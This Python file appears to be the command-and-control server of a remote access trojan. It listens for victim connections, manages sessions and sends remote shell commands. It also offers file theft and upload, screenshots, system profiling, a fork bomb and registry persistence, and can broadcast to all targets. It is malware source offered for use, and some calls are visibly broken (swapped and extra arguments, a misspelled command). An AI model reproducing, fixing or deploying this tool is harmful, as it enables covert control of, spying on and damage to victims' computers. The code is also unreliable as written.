import socket, termcolor
import json
import os
import shutil
import sys
import subprocess
import threading

RHOST = "your ip"
RPORT = 4000

def reliable_recv(target):
   data = ''
   while True:
      try:
         data = data + target.recv(1024).decode().rstrip()
         return json.loads(data)
      except ValueError:
         continue

def reliable_send(target ,data):
   jsondata = json.dumps(data)
   target.send(jsondata.encode())

def upload_file(target, file_name):
   f = open(file_name, 'rb')
   target.send(f.read())


def download_file(target ,file_name):
   f = open(file_name, 'wb')
   target.settimeout(20)
   chunk = target.recv(1024)
   while chunk:
      f.write(chunk)
      try:
         chunk = target.recv(1024)
      except socket.timeout as e:
         break
   target.settimeout(None)
   f.close()


def targets_reqs(target, ip):
   count=0
   while True:
      cmd = input(termcolor.colored('* Shell~%s: ' % str(ip), 'red'))
      reliable_send(target, cmd)
      if cmd == 'exit':
         print(termcolor.colored('[-] Goodbye', 'red'))
         break
      elif cmd == 'help':
         print(termcolor.colored("""\n
         exit                                   # Exit Session With The Target
         clear                                  # Clear The Screen
         screenshot                             # Make Screeshot On The Target Machine
         frokbomb                               # Send Frokbomb To The Target Machine
         sysinfo                                # Get Target Machine Info
         cd *Dir Name*                          # Changes Directory On Target Machine
         upload *File Name*                     # Upload File To The Target Machine
         download *File name*                   # Download File From The Target Machine
         persistence *RegName* *FileName*       # Create Persistence In Registry Note Working On Windows Only
         """, 'blue'))
      elif cmd == 'clear':
         os.system('clear')
      elif cmd[:3] == 'cd ':
         l = reliable_recv(target, target)
         print(l)
         pass
      elif cmd[:6] == 'upload':
         try:
            upload_file(target ,cmd[7:])
            print(termcolor.colored('[+] Done Uploaded file', 'green'))
            pass
         except FileNotFoundError:
            pass
      elif cmd[:8] == 'download':
         try:
            download_file(target, cmd[9:])
            print(termcolor.colored('[+] Done Downloaded file', 'green'))
         except FileNotFoundError:
            pass
      elif cmd[:10] == 'screenshot':
         f = open('screenshot%d.png' % (count), 'wb')
         target.settimeout(7)
         chunk = target.recv(1024)
         while chunk:
            f.write(chunk)
            try:
               chunk = target.recv(1024)
            except socket.timeout as e:
               break
         target.settimeout(None)
         f.close()
         count += 1
         print(termcolor.colored('[+] Done screenshot saved', 'green'))
      elif cmd[:11] == 'persistence':
         log = reliable_recv(target)
         print(log)
         pass
      elif cmd == "sysinfo":
         log = reliable_recv(target)
         print(log)
      elif cmd == "forkbomb":
         res = reliable_recv(target)
         print(res)
      else:
         result = reliable_recv(target)
         print(result)

def accept_connections():
   while True:
      if stopflag:
         break
      skt.settimeout(1)
      try:
         target, ip = skt.accept()
         targets.append(target)
         ips.append(ip)
         print(termcolor.colored("[+] Target connected from: " + str(ip), "green"))
      except:
         pass


targets = []
ips = []
stopflag = False
skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
skt.bind((RHOST, RPORT))
print(termcolor.colored("[+] Listening for incoming requests ...", "green"))
skt.listen(15)
t1 = threading.Thread(target=accept_connections)
t1.start()

while True:
   command = input(termcolor.colored("[**] Command & Control System: ", "green"))
   if command == "targets":
      counter = 0
      for ip in ips:
         print(termcolor.colored("Session " + str(counter) + "---" + str(ip), "red"))
         counter += 1
   elif command == "clear":
      os.system("clear")
   elif command[:7] == "session":
      try:
         num = int(command[8:])
         tarnum = targets[num]
         tarip = ips[num]
         targets_reqs(tarip, tarnum)
      except:
         print(termcolor.colored("[-] No session under that ID number", "red"))
   elif command == "exit":
      for target in targets:
         reliable_send(target, "exit")
         target.close()
      skt.close()
      stopflag = True
      t1.join()
      break
   elif command[:4] == "kill":
      targ = targets[int(command[5:])]
      ip = ips[int(command[5:])]
      reliable_send(targ, "exit")
      targ.close()
      targets.remove(targ)
      ips.remove(ip)
   elif command[:7] == "sendall":
      x = len(targets)
      print(x)
      i = 0
      try:
         while i < x:
            tarnumber = targets[i]
            print(termcolor.colored(tarnumber, "blue"))

            reliable_send(tarnumber, command)
            i += 1
      except:
         print(termcolor.colored("[-] Failed", "red"))
   else:
      print(termcolor.colored("[-] Command doesn't exist !", "red"))





